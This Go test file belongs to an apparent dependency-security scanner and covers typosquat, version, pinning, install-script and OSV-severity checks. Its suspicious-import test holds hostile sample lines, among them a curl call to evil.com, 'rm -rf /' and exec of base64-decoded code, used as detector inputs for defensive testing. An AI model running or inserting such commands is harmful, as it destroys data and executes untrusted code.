package checker

import (
	"testing"
	"time"

	"github.com/apoorv-kulkarni/vigiles/internal/scanner"
)

func TestLevenshtein(t *testing.T) {
	tests := []struct{ a, b string; want int }{
		{"", "", 0}, {"abc", "abc", 0}, {"abc", "ab", 1},
		{"abc", "abcd", 1}, {"abc", "aXc", 1},
		{"requests", "requets", 1}, {"numpy", "numpi", 1},
	}
	for _, tt := range tests {
		if got := levenshtein(tt.a, tt.b); got != tt.want {
			t.Errorf("levenshtein(%q, %q) = %d, want %d", tt.a, tt.b, got, tt.want)
		}
	}
}

func TestCheckTyposquat(t *testing.T) {
	popular := []string{"requests", "numpy", "flask", "django", "pandas"}
	tests := []struct{ name string; wantHit bool; wantPkg string }{
		{"requets", true, "requests"},
		{"numpypy", true, "numpy"},
		{"flasklib", true, "flask"},
		{"djang", true, "django"},
		{"requests", false, ""},
		{"httpx", false, ""},
		{"pipx", false, ""},
		{"totally_unrelated", false, ""},
	}
	for _, tt := range tests {
		result := checkTyposquat(tt.name, popular)
		if tt.wantHit && result == "" {
			t.Errorf("checkTyposquat(%q): expected hit on %q, got none", tt.name, tt.wantPkg)
		} else if tt.wantHit && result != tt.wantPkg {
			t.Errorf("checkTyposquat(%q) = %q, want %q", tt.name, result, tt.wantPkg)
		} else if !tt.wantHit && result != "" {
			t.Errorf("checkTyposquat(%q): expected no match, got %q", tt.name, result)
		}
	}
}

func TestIsSuspiciousVersion(t *testing.T) {
	tests := []struct{ version string; want bool }{
		{"1.0.0dev", true}, {"2.0.0alpha", true}, {"3.0.0rc2", true},
		{"999.0.0", true}, {"100.0.0", true},
		{"1.0.0", false}, {"0.1.0", false}, {"22.3.1", false},
		{"2026.1.4", false}, {"2025.12.1", false},
	}
	for _, tt := range tests {
		if got := isSuspiciousVersion(tt.version); got != tt.want {
			t.Errorf("isSuspiciousVersion(%q) = %v, want %v", tt.version, got, tt.want)
		}
	}
}

func TestContainsSuspiciousImport(t *testing.T) {
	tests := []struct{ line string; want bool }{
		{"import subprocess; subprocess.Popen(['curl', 'http://evil.com'])", true},
		{"import os; os.system('rm -rf /')", true},
		{"import base64; exec(base64.b64decode('...'))", true},
		{"import json", false},
		{"import pathlib", false},
	}
	for _, tt := range tests {
		if got := containsSuspiciousImport(tt.line); got != tt.want {
			t.Errorf("containsSuspiciousImport(%q) = %v, want %v", tt.line, got, tt.want)
		}
	}
}

func TestCheckUnpinned(t *testing.T) {
	tests := []struct {
		name, spec, eco string
		wantSignal      bool
	}{
		{"requests", "==2.31.0", "pip", false},
		{"requests", ">=2.31.0", "pip", true},
		{"requests", "~=2.31", "pip", true},
		{"requests", "", "pip", true},
		{"express", "4.18.2", "npm", false},
		{"express", "^4.18.2", "npm", true},
		{"express", "~4.18.2", "npm", true},
	}
	for _, tt := range tests {
		sig := CheckUnpinned(tt.name, tt.spec, tt.eco)
		if tt.wantSignal && sig == nil {
			t.Errorf("CheckUnpinned(%q, %q, %q): expected signal, got nil", tt.name, tt.spec, tt.eco)
		}
		if !tt.wantSignal && sig != nil {
			t.Errorf("CheckUnpinned(%q, %q, %q): expected nil, got signal", tt.name, tt.spec, tt.eco)
		}
	}
}

func TestCheckNpmInstallScripts(t *testing.T) {
	scripts := map[string]string{
		"preinstall":  "node setup.js",
		"test":        "jest",
		"postinstall": "node postsetup.js",
	}
	sigs := checkScriptsMap("test-pkg", "1.0.0", scripts)
	if len(sigs) != 2 {
		t.Fatalf("expected 2 signals for preinstall+postinstall, got %d", len(sigs))
	}
	for _, sig := range sigs {
		if sig.ID != "VIGILES-NPM-INSTALL-SCRIPT" {
			t.Errorf("unexpected ID: %s", sig.ID)
		}
		if sig.Type != "trust-signal" {
			t.Errorf("expected trust-signal type, got %s", sig.Type)
		}
	}

	// No risk scripts
	sigs2 := checkScriptsMap("safe-pkg", "1.0.0", map[string]string{"test": "jest", "build": "tsc"})
	if len(sigs2) != 0 {
		t.Errorf("expected 0 signals for safe scripts, got %d", len(sigs2))
	}
}

func TestRecencyChecker_Recent(t *testing.T) {
	fixedNow := time.Date(2026, 3, 26, 12, 0, 0, 0, time.UTC)

	data := pypiVersionResponse{
		Urls: []pypiFile{
			{UploadTimeISO: "2026-03-25T10:00:00Z"},
		},
	}
	uploadTime := extractUploadTime(data)
	age := fixedNow.Sub(uploadTime)
	if age >= recentThreshold {
		t.Errorf("expected upload to be recent (age=%v), threshold=%v", age, recentThreshold)
	}
}

func TestRecencyChecker_Old(t *testing.T) {
	fixedNow := time.Date(2026, 3, 30, 12, 0, 0, 0, time.UTC)

	data := pypiVersionResponse{
		Urls: []pypiFile{
			{UploadTimeISO: "2026-01-01T10:00:00Z"},
		},
	}
	uploadTime := extractUploadTime(data)
	age := fixedNow.Sub(uploadTime)
	if age < recentThreshold {
		t.Errorf("expected upload to be old (age=%v)", age)
	}
}

func TestRecencyChecker_Cache(t *testing.T) {
	rc := NewRecencyChecker()
	// Pre-populate cache
	rc.cache["test-pkg@1.0.0"] = &recencyCacheEntry{
		uploadTime: time.Date(2026, 3, 29, 10, 0, 0, 0, time.UTC),
		found:      true,
	}
	rc.Now = func() time.Time { return time.Date(2026, 3, 30, 10, 0, 0, 0, time.UTC) }

	pkg := scanner.Package{Name: "test-pkg", Version: "1.0.0", Ecosystem: "pip"}
	sig, err := rc.checkPyPI(pkg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if sig == nil {
		t.Fatal("expected recent signal from cached data")
	}
	if sig.ID != "VIGILES-RECENTLY-PUBLISHED" {
		t.Errorf("expected VIGILES-RECENTLY-PUBLISHED, got %s", sig.ID)
	}
}

func TestExtractUploadTime_MissingFields(t *testing.T) {
	data := pypiVersionResponse{Urls: []pypiFile{}}
	if got := extractUploadTime(data); !got.IsZero() {
		t.Errorf("expected zero time for empty urls, got %v", got)
	}
}

func TestFormatDuration(t *testing.T) {
	tests := []struct {
		d    time.Duration
		want string
	}{
		{30 * time.Minute, "< 1 hour"},
		{5 * time.Hour, "5 hours"},
		{36 * time.Hour, "1 days"},
		{72 * time.Hour, "3 days"},
	}
	for _, tt := range tests {
		if got := formatDuration(tt.d); got != tt.want {
			t.Errorf("formatDuration(%v) = %q, want %q", tt.d, got, tt.want)
		}
	}
}

func TestHeuristicChecker_SystemChecksLabeled(t *testing.T) {
	// Verify that system checks use system-heuristic type, not heuristic
	c := NewHeuristicChecker()
	signals := c.Check([]scanner.Package{})
	for _, sig := range signals {
		if sig.Ecosystem == "system" && sig.Type != "system-heuristic" {
			t.Errorf("System check %s has type %q, expected 'system-heuristic'", sig.ID, sig.Type)
		}
	}
}

func TestOSV_ScoreToSeverity(t *testing.T) {
	tests := []struct{ score float64; want string }{
		{9.8, "critical"}, {9.0, "critical"},
		{7.5, "high"}, {7.0, "high"},
		{4.0, "medium"}, {6.9, "medium"},
		{0.1, "low"}, {3.9, "low"},
		{0.0, "info"},
	}
	for _, tt := range tests {
		if got := scoreToSeverity(tt.score); got != tt.want {
			t.Errorf("scoreToSeverity(%v) = %q, want %q", tt.score, got, tt.want)
		}
	}
}

func TestOSV_ClassifySeverityFallback(t *testing.T) {
	// No severity data → should return "unknown", not guess
	vuln := osvVuln{ID: "GHSA-1234", Summary: "test"}
	if got := classifySeverity(vuln); got != "unknown" {
		t.Errorf("classifySeverity with no data = %q, want 'unknown'", got)
	}
}

func TestOSV_MapEcosystem(t *testing.T) {
	if got := mapEcosystem("pip"); got != "PyPI" {
		t.Errorf("mapEcosystem(pip) = %q, want PyPI", got)
	}
	if got := mapEcosystem("npm"); got != "npm" {
		t.Errorf("mapEcosystem(npm) = %q, want npm", got)
	}
	// Brew should return empty — we don't query OSV for it
	if got := mapEcosystem("brew"); got != "" {
		t.Errorf("mapEcosystem(brew) = %q, want empty", got)
	}
}
